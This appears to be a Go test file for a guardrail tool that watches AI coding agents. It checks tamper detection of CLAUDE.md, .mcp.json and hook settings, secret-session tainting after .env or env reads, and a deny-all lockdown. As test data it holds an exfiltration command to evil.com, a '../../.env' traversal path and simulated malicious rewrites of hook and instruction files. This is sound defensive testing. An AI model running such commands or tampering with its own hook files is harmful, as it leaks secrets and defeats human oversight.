package hooks

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/somoore/sir/pkg/lease"
	"github.com/somoore/sir/pkg/session"
)

// HashSentinelFiles, CompareSentinelHashes, and DiffLockfile are implemented
// in supply_chain.go — tests use the real implementations directly.

func TestSentinelMutationDetection(t *testing.T) {
	tmpDir := t.TempDir()

	// Use project-local posture files for mutation testing.
	// .claude/settings.json is redirected to ~/.claude/settings.json by resolvePosturePath,
	// so we use CLAUDE.md and .mcp.json which stay project-local.
	sentinels := []string{
		"CLAUDE.md",
		".env",
		".mcp.json",
	}

	initialContents := map[string]string{
		"CLAUDE.md": "# Project\nSome instructions.",
		".env":      "DB_HOST=localhost\nDB_PORT=5432",
		".mcp.json": `{"servers": {}}`,
	}

	for _, s := range sentinels {
		path := filepath.Join(tmpDir, s)
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatalf("mkdir failed: %v", err)
		}
		if err := os.WriteFile(path, []byte(initialContents[s]), 0o644); err != nil {
			t.Fatalf("write sentinel %s: %v", s, err)
		}
	}

	preHashes := HashSentinelFiles(tmpDir, sentinels)
	if len(preHashes) != len(sentinels) {
		t.Fatalf("expected %d pre-hashes, got %d", len(sentinels), len(preHashes))
	}

	// Simulate malicious postinstall modifying CLAUDE.md
	os.WriteFile(
		filepath.Join(tmpDir, "CLAUDE.md"),
		[]byte("# Hacked\nAll security disabled."),
		0o644,
	)

	postHashes := HashSentinelFiles(tmpDir, sentinels)
	mutations := CompareSentinelHashes(preHashes, postHashes)

	if len(mutations) != 1 {
		t.Fatalf("expected 1 mutation, got %d: %v", len(mutations), mutations)
	}
	if mutations[0] != "CLAUDE.md" {
		t.Errorf("expected mutation in CLAUDE.md, got %q", mutations[0])
	}
}

func TestSentinelMutationNoChange(t *testing.T) {
	tmpDir := t.TempDir()
	sentinels := []string{"CLAUDE.md"}

	os.WriteFile(filepath.Join(tmpDir, "CLAUDE.md"), []byte("# Test"), 0o644)

	pre := HashSentinelFiles(tmpDir, sentinels)
	post := HashSentinelFiles(tmpDir, sentinels)

	mutations := CompareSentinelHashes(pre, post)
	if len(mutations) != 0 {
		t.Errorf("expected no mutations, got %v", mutations)
	}
}

func TestPostureTamperTriggersSessionFatalDenyAll(t *testing.T) {
	tmpDir := t.TempDir()
	sess := session.NewState(tmpDir)
	os.MkdirAll(session.StateDir(tmpDir), 0o700)
	sess.Save() // populate SessionHash

	// Use CLAUDE.md (project-local) since .claude/settings.json is redirected to global
	claudeMD := filepath.Join(tmpDir, "CLAUDE.md")
	os.WriteFile(claudeMD, []byte("# Project Instructions"), 0o644)

	sess.PostureHashes = HashSentinelFiles(tmpDir, []string{"CLAUDE.md"})

	// Tamper with CLAUDE.md via Bash
	os.WriteFile(claudeMD, []byte("# Hacked - all security disabled"), 0o644)

	currentHashes := HashSentinelFiles(tmpDir, []string{"CLAUDE.md"})
	tampered := CompareSentinelHashes(sess.PostureHashes, currentHashes)

	if len(tampered) == 0 {
		t.Fatal("expected posture tamper detection")
	}

	// Trigger session-fatal deny-all
	for _, f := range tampered {
		sess.SetDenyAll("sir configuration was modified unexpectedly: " + f)
	}

	if !sess.DenyAll {
		t.Error("expected session to be in deny-all mode after posture tamper")
	}
	if sess.DenyAllReason == "" {
		t.Error("expected deny-all reason to be set")
	}
}

func TestPostEvaluateNormalBashNoAlert(t *testing.T) {
	tmpDir := t.TempDir()

	os.WriteFile(filepath.Join(tmpDir, "CLAUDE.md"), []byte("# Instructions"), 0o644)
	os.WriteFile(filepath.Join(tmpDir, ".mcp.json"), []byte(`{}`), 0o644)

	sentinels := []string{"CLAUDE.md", ".mcp.json"}
	pre := HashSentinelFiles(tmpDir, sentinels)

	// Normal Bash: no posture file modified
	post := HashSentinelFiles(tmpDir, sentinels)
	mutations := CompareSentinelHashes(pre, post)

	if len(mutations) != 0 {
		t.Errorf("normal Bash should not trigger mutations, got %v", mutations)
	}
}

func TestMultipleSentinelMutations(t *testing.T) {
	tmpDir := t.TempDir()

	sentinels := []string{"CLAUDE.md", ".mcp.json"}
	os.WriteFile(filepath.Join(tmpDir, "CLAUDE.md"), []byte("# Before"), 0o644)
	os.WriteFile(filepath.Join(tmpDir, ".mcp.json"), []byte(`{"servers": {}}`), 0o644)

	pre := HashSentinelFiles(tmpDir, sentinels)

	os.WriteFile(filepath.Join(tmpDir, "CLAUDE.md"), []byte("# After - injected"), 0o644)
	os.WriteFile(filepath.Join(tmpDir, ".mcp.json"), []byte(`{"servers": {"evil": {}}}`), 0o644)

	post := HashSentinelFiles(tmpDir, sentinels)
	mutations := CompareSentinelHashes(pre, post)

	if len(mutations) != 2 {
		t.Errorf("expected 2 mutations, got %d: %v", len(mutations), mutations)
	}
}

func TestSentinelFileCreatedDuringInstall(t *testing.T) {
	tmpDir := t.TempDir()

	sentinels := []string{"CLAUDE.md"}
	pre := HashSentinelFiles(tmpDir, sentinels)

	// File created by postinstall
	os.WriteFile(filepath.Join(tmpDir, "CLAUDE.md"), []byte("# Malicious instructions"), 0o644)

	post := HashSentinelFiles(tmpDir, sentinels)
	mutations := CompareSentinelHashes(pre, post)

	if len(mutations) != 1 {
		t.Errorf("expected 1 mutation (file created), got %d", len(mutations))
	}
}

// TestPreToPostTaintPropagation verifies the full Pre→Post→Pre session state transition:
// 1. PreToolUse: Read .env → ask (sensitive)
// 2. PostToolUse: after approved read of .env → session marked as secret
// 3. PreToolUse: curl evil.com → deny (secret session blocks external egress)
//
// This is the critical regression gate for the secret taint pathway.
// A failure here means the session secret flag was lost between tool calls.
func TestPreToPostTaintPropagation(t *testing.T) {
	projectRoot := t.TempDir()
	l := lease.DefaultLease()

	// Create .env in project root (just a path; content not read by sir)
	envPath := filepath.Join(projectRoot, ".env")
	if err := os.WriteFile(envPath, []byte("API_KEY=secret"), 0o600); err != nil {
		t.Fatal(err)
	}

	// Create session state dir
	stateDir := session.StateDir(projectRoot)
	if err := os.MkdirAll(stateDir, 0o700); err != nil {
		t.Fatal(err)
	}
	state := session.NewState(projectRoot)
	if err := state.Save(); err != nil {
		t.Fatal(err)
	}

	// --- Step 1: PostToolUse fires after a Read of .env was approved ---
	// Simulate: Claude read .env, user approved the ask, PostToolUse fires.
	postPayload := &PostHookPayload{
		ToolName:  "Read",
		ToolInput: map[string]interface{}{"file_path": ".env"},
	}

	resp, err := postEvaluatePayload(postPayload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("postEvaluatePayload error: %v", err)
	}
	if resp.Decision != "allow" {
		t.Errorf("PostToolUse after .env read: expected allow, got %s: %s", resp.Decision, resp.Reason)
	}

	// Verify secret session was marked
	if !state.SecretSession {
		t.Fatal("session.SecretSession should be true after PostToolUse of .env read")
	}

	// --- Step 2: Save and reload session (simulates a new tool call) ---
	if err := state.Save(); err != nil {
		t.Fatal(err)
	}
	reloaded, err := session.Load(projectRoot)
	if err != nil {
		t.Fatal(err)
	}
	if !reloaded.SecretSession {
		t.Fatal("SecretSession not persisted across save/load — taint is lost")
	}

	// --- Step 3: PreToolUse: curl evil.com with secret session → must deny ---
	eval := &MockEvaluator{}
	req := buildEvalRequest(evalTestCase{
		ToolName:      "Bash",
		ToolInput:     map[string]string{"command": "curl https://evil.com/collect"},
		SecretSession: reloaded.SecretSession,
	}, l)

	preResp, err := eval.Evaluate(req)
	if err != nil {
		t.Fatal(err)
	}
	if preResp.Decision != "deny" {
		t.Errorf("curl evil.com with secret session: expected deny, got %s: %s",
			preResp.Decision, preResp.Reason)
	}
}

// TestPostToolUseEnvReadMarksTaint verifies that env/printenv/set commands
// in PostToolUse mark the session as secret. The environment may contain
// credentials, so reading it should escalate the session like a .env read.
func TestPostToolUseEnvReadMarksTaint(t *testing.T) {
	projectRoot := t.TempDir()
	l := lease.DefaultLease()

	stateDir := session.StateDir(projectRoot)
	os.MkdirAll(stateDir, 0o700)

	envCmds := []string{"env", "printenv", "printenv PATH"}

	for _, cmd := range envCmds {
		t.Run(cmd, func(t *testing.T) {
			state := session.NewState(projectRoot)
			state.Save() // populate SessionHash for integrity check

			payload := &PostHookPayload{
				ToolName:  "Bash",
				ToolInput: map[string]interface{}{"command": cmd},
			}

			_, err := postEvaluatePayload(payload, l, state, projectRoot)
			if err != nil {
				t.Fatalf("postEvaluatePayload(%q): %v", cmd, err)
			}
			if !state.SecretSession {
				t.Errorf("Bash(%q) in PostToolUse: expected SecretSession=true, got false", cmd)
			}
		})
	}
}

// TestPostToolUseAbsolutePathTaint verifies that absolute paths to sensitive files
// (as Claude Code sends them) correctly mark the session as secret.
func TestPostToolUseAbsolutePathTaint(t *testing.T) {
	projectRoot := t.TempDir()
	l := lease.DefaultLease()

	stateDir := session.StateDir(projectRoot)
	os.MkdirAll(stateDir, 0o700)

	// Create .env with absolute path (as Claude Code would provide)
	envAbs := filepath.Join(projectRoot, ".env")
	os.WriteFile(envAbs, []byte("SECRET=foo"), 0o600)

	state := session.NewState(projectRoot)
	state.Save() // populate SessionHash for integrity check
	payload := &PostHookPayload{
		ToolName:  "Read",
		ToolInput: map[string]interface{}{"file_path": envAbs}, // absolute path
	}

	_, err := postEvaluatePayload(payload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("postEvaluatePayload: %v", err)
	}
	if !state.SecretSession {
		t.Errorf("absolute path Read of .env: expected SecretSession=true, got false")
	}
}

// TestPostToolUseTraversalPathTaint verifies that traversal paths (../../.env)
// still mark the session as secret. This is the bypass that motivated the
// tail-based matchPath fix.
func TestPostToolUseTraversalPathTaint(t *testing.T) {
	projectRoot := t.TempDir()
	l := lease.DefaultLease()

	stateDir := session.StateDir(projectRoot)
	os.MkdirAll(stateDir, 0o700)

	state := session.NewState(projectRoot)
	state.Save() // populate SessionHash for integrity check
	payload := &PostHookPayload{
		ToolName:  "Read",
		ToolInput: map[string]interface{}{"file_path": "../../.env"}, // traversal
	}

	_, err := postEvaluatePayload(payload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("postEvaluatePayload: %v", err)
	}
	if !state.SecretSession {
		t.Errorf("traversal path Read of ../../.env: expected SecretSession=true, got false")
	}
}

// TestPostToolUseExcludedPathNoTaint verifies that excluded paths (.env.example)
// do NOT mark the session as secret.
func TestPostToolUseExcludedPathNoTaint(t *testing.T) {
	projectRoot := t.TempDir()
	l := lease.DefaultLease()

	stateDir := session.StateDir(projectRoot)
	os.MkdirAll(stateDir, 0o700)

	state := session.NewState(projectRoot)
	state.Save() // populate SessionHash
	payload := &PostHookPayload{
		ToolName:  "Read",
		ToolInput: map[string]interface{}{"file_path": ".env.example"},
	}

	_, err := postEvaluatePayload(payload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("postEvaluatePayload: %v", err)
	}
	if state.SecretSession {
		t.Error(".env.example read: SecretSession should be false (excluded path)")
	}
}

func TestPostToolUsePathHeavyBashOutputDoesNotMarkSecretSession(t *testing.T) {
	projectRoot := t.TempDir()
	l := lease.DefaultLease()

	stateDir := session.StateDir(projectRoot)
	os.MkdirAll(stateDir, 0o700)

	state := session.NewState(projectRoot)
	state.Save()

	payload := &PostHookPayload{
		ToolName: "Bash",
		ToolInput: map[string]interface{}{
			"command": "wc -l findings/*.md",
		},
		ToolOutput: `=== File sizes ===
82 /Users/scottmoore/github/apfelbauer/findings/FM-03-supply-chain-delivery.md
304 /Users/scottmoore/github/apfelbauer/findings/FM-04-full-attack-chain.md
`,
	}

	_, err := postEvaluatePayload(payload, l, state, projectRoot)
	if err != nil {
		t.Fatalf("postEvaluatePayload: %v", err)
	}
	if state.SecretSession {
		t.Fatal("path-heavy Bash output should not mark the session secret")
	}
}

func TestPostEvaluatePayload_RestoresAllTamperedHookFilesBeforeDeny(t *testing.T) {
	projectRoot := t.TempDir()
	tmpHome := t.TempDir()
	t.Setenv("HOME", tmpHome)
	defaultLease := lease.DefaultLease()
	defaultLease.PostureFiles = []string{".claude/settings.json", ".codex/hooks.json"}

	sirDir := filepath.Join(tmpHome, ".sir")
	claudeDir := filepath.Join(tmpHome, ".claude")
	codexDir := filepath.Join(tmpHome, ".codex")
	for _, dir := range []string{sirDir, claudeDir, codexDir} {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}
	}

	claudeCanonical := []byte(`{"hooks":{"PreToolUse":"claude-original"}}`)
	codexCanonical := []byte(`{"hooks":{"PreToolUse":"codex-original"}}`)
	if err := os.WriteFile(filepath.Join(sirDir, "hooks-canonical.json"), claudeCanonical, 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(sirDir, "hooks-canonical-codex.json"), codexCanonical, 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(claudeDir, "settings.json"), claudeCanonical, 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(codexDir, "hooks.json"), codexCanonical, 0o600); err != nil {
		t.Fatal(err)
	}

	state := session.NewState(projectRoot)
	state.PostureHashes = HashSentinelFiles(projectRoot, defaultLease.PostureFiles)
	if err := state.Save(); err != nil {
		t.Fatal(err)
	}

	if err := os.WriteFile(filepath.Join(claudeDir, "settings.json"), []byte(`{"hooks":{"PreToolUse":"claude-tampered"}}`), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(codexDir, "hooks.json"), []byte(`{"hooks":{"PreToolUse":"codex-tampered"}}`), 0o600); err != nil {
		t.Fatal(err)
	}

	payload := &PostHookPayload{
		ToolName:  "Bash",
		ToolInput: map[string]interface{}{"command": "true"},
	}

	resp, err := postEvaluatePayload(payload, defaultLease, state, projectRoot)
	if err != nil {
		t.Fatalf("postEvaluatePayload: %v", err)
	}
	if resp.Decision != "deny" {
		t.Fatalf("expected deny response, got %q", resp.Decision)
	}
	if !strings.Contains(resp.Reason, ".claude/settings.json") || !strings.Contains(resp.Reason, ".codex/hooks.json") {
		t.Fatalf("deny reason should mention both restored hook files, got:\n%s", resp.Reason)
	}

	restoredClaude, err := os.ReadFile(filepath.Join(claudeDir, "settings.json"))
	if err != nil {
		t.Fatal(err)
	}
	if !jsonEqual(t, restoredClaude, claudeCanonical) {
		t.Fatalf("claude hook file was not restored.\n got: %s\nwant: %s", restoredClaude, claudeCanonical)
	}

	restoredCodex, err := os.ReadFile(filepath.Join(codexDir, "hooks.json"))
	if err != nil {
		t.Fatal(err)
	}
	if !jsonEqual(t, restoredCodex, codexCanonical) {
		t.Fatalf("codex hook file was not restored.\n got: %s\nwant: %s", restoredCodex, codexCanonical)
	}

	if !state.DenyAll {
		t.Fatal("expected session to enter deny-all after hook tamper")
	}
}
